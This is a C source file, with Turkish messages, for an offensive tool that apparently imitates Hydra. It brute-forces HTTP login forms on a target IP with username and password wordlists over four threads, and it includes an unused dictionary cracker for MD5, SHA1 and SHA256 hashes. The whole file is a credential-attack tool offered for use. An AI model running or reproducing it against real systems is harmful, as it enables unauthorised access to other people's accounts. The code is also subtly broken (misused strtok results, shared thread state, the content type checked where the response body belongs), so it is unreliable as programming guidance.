#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <curl/curl.h>
#include <openssl/md5.h>
#include <openssl/sha.h>

#define MAX_WORD_LEN 256
#define MAX_URL_LEN 1024
#define MAX_MSG_LEN 1024

typedef enum {
    HASH_MD5,
    HASH_SHA1,
    HASH_SHA256,
    HASH_UNKNOWN
} hash_type_t;

typedef struct {
    char *target_ip;
    char *username_list;
    char *password_list;
    char *attack_type;
    char *form_info;
    char *error_message;
    char *hash;
    hash_type_t hash_type;
    int thread_id;
    int num_threads;
    int verbose;
    char *method; // Yeni parametre: HTTP metodunu belirtir
    char *form_fields; // Yeni parametre: Form alanları
} thread_data_t;

void hash_md5(const char *input, char *output) {
    unsigned char digest[MD5_DIGEST_LENGTH];
    MD5((unsigned char *)input, strlen(input), digest);
    for (int i = 0; i < MD5_DIGEST_LENGTH; i++) {
        sprintf(&output[i * 2], "%02x", digest[i]);
    }
}

void hash_sha1(const char *input, char *output) {
    unsigned char digest[SHA_DIGEST_LENGTH];
    SHA1((unsigned char *)input, strlen(input), digest);
    for (int i = 0; i < SHA_DIGEST_LENGTH; i++) {
        sprintf(&output[i * 2], "%02x", digest[i]);
    }
}

void hash_sha256(const char *input, char *output) {
    unsigned char digest[SHA256_DIGEST_LENGTH];
    SHA256((unsigned char *)input, strlen(input), digest);
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        sprintf(&output[i * 2], "%02x", digest[i]);
    }
}

void *hash_crack(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    FILE *pass_file = fopen(data->password_list, "r");
    if (!pass_file) {
        perror("Parola dosyası açılamadı");
        return NULL;
    }

    char password[MAX_WORD_LEN];
    char hashed_password[MAX_WORD_LEN];
    char computed_hash[MAX_WORD_LEN];

    while (fscanf(pass_file, "%s", password) != EOF) {
        switch (data->hash_type) {
            case HASH_MD5:
                hash_md5(password, computed_hash);
                break;
            case HASH_SHA1:
                hash_sha1(password, computed_hash);
                break;
            case HASH_SHA256:
                hash_sha256(password, computed_hash);
                break;
            default:
                fprintf(stderr, "Bilinmeyen hash türü\n");
                fclose(pass_file);
                return NULL;
        }

        if (strcmp(computed_hash, data->hash) == 0) {
            if (data->verbose) {
                printf("Şifre bulundu: %s\n", password);
            }
            fclose(pass_file);
            return NULL;
        }
    }

    fclose(pass_file);
    return NULL;
}

void *http_get_form_attack(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    FILE *user_file = fopen(data->username_list, "r");
    FILE *pass_file = fopen(data->password_list, "r");
    if (!user_file || !pass_file) {
        perror("Kullanıcı veya parola dosyası açılamadı");
        if (user_file) fclose(user_file);
        if (pass_file) fclose(pass_file);
        return NULL;
    }

    CURL *curl;
    CURLcode res;
    char post_data[1024];
    char username[MAX_WORD_LEN];
    char password[MAX_WORD_LEN];
    char url[MAX_URL_LEN];

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (!curl) {
        perror("cURL başlatılamadı");
        fclose(user_file);
        fclose(pass_file);
        return NULL;
    }

    while (fscanf(user_file, "%s", username) != EOF) {
        while (fscanf(pass_file, "%s", password) != EOF) {
            if (data->thread_id != (ftell(user_file) % data->num_threads)) {
                continue;
            }

            snprintf(url, sizeof(url), "http://%s%s", data->target_ip, data->form_info);
            snprintf(post_data, sizeof(post_data), "%s=%s&%s=%s&%s", 
                     strtok(data->form_fields, "&")[0], username, 
                     strtok(NULL, "&")[0], password, 
                     strtok(NULL, "&")[0]);

            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);

            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "cURL hatası: %s\n", curl_easy_strerror(res));
                continue;
            }

            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            if (response_code == 200) {
                // Hata mesajını kontrol et
                char *response;
                curl_easy_getinfo(curl, CURLINFO_CONTENT_TYPE, &response);
                if (strstr(response, data->error_message) == NULL) {
                    if (data->verbose) {
                        printf("Şifre bulundu: %s:%s\n", username, password);
                    }
                    fclose(user_file);
                    fclose(pass_file);
                    curl_easy_cleanup(curl);
                    curl_global_cleanup();
                    exit(0);
                }
            }
            // Dosyaların başına dön
            fseek(pass_file, 0, SEEK_SET);
        }
    }

    fclose(user_file);
    fclose(pass_file);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 6) {
        fprintf(stderr, "Kullanım: %s <hedef_ip> -l <kullanıcı_listesi> -p <parola_listesi> <saldırı_türü> \"[sayfa_yolu]:[form_alanları]:F=[hata_mesajı]\" [-v] [-h <hash> -t <hash_türü>]\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    char *username_list = NULL;
    char *password_list = NULL;
    char *attack_type = NULL;
    char *form_info = NULL;
    char *error_message = NULL;
    char *hash = NULL;
    hash_type_t hash_type = HASH_UNKNOWN;
    int verbose = 0;
    char *method = NULL;
    char *form_fields = NULL;

    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-l") == 0 && i + 1 < argc) {
            username_list = argv[++i];
        } else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            password_list = argv[++i];
        } else if (strcmp(argv[i], "http-get-form") == 0 || strcmp(argv[i], "http-post-form") == 0) {
            attack_type = argv[i];
            form_info = argv[++i];
            error_message = argv[++i];
        } else if (strcmp(argv[i], "-v") == 0) {
            verbose = 1;
        } else if (strcmp(argv[i], "-h") == 0 && i + 1 < argc) {
            hash = argv[++i];
        } else if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) {
            if (strcmp(argv[++i], "md5") == 0) {
                hash_type = HASH_MD5;
            } else if (strcmp(argv[i], "sha1") == 0) {
                hash_type = HASH_SHA1;
            } else if (strcmp(argv[i], "sha256") == 0) {
                hash_type = HASH_SHA256;
            } else {
                fprintf(stderr, "Bilinmeyen hash türü\n");
                return 1;
            }
        } else if (strcmp(argv[i], "-m") == 0 && i + 1 < argc) {
            method = argv[++i];
        } else if (strcmp(argv[i], "-f") == 0 && i + 1 < argc) {
            form_fields = argv[++i];
        }
    }

    if (!username_list || !password_list || !attack_type || !form_info || !error_message) {
        fprintf(stderr, "Eksik argümanlar. Kullanım: %s <hedef_ip> -l <kullanıcı_listesi> -p <parola_listesi> <saldırı_türü> \"[sayfa_yolu]:[form_alanları]:F=[hata_mesajı]\" [-v] [-h <hash> -t <hash_türü>]\n", argv[0]);
        return 1;
    }

    thread_data_t data;
    data.target_ip = target_ip;
    data.username_list = username_list;
    data.password_list = password_list;
    data.attack_type = attack_type;
    data.form_info = form_info;
    data.error_message = error_message;
    data.hash = hash;
    data.hash_type = hash_type;
    data.verbose = verbose;
    data.method = method;
    data.form_fields = form_fields;
    data.thread_id = 0;
    data.num_threads = 4;

    pthread_t threads[data.num_threads];
    for (int i = 0; i < data.num_threads; i++) {
        data.thread_id = i;
        pthread_create(&threads[i], NULL, http_get_form_attack, (void *)&data);
    }
    for (int i = 0; i < data.num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
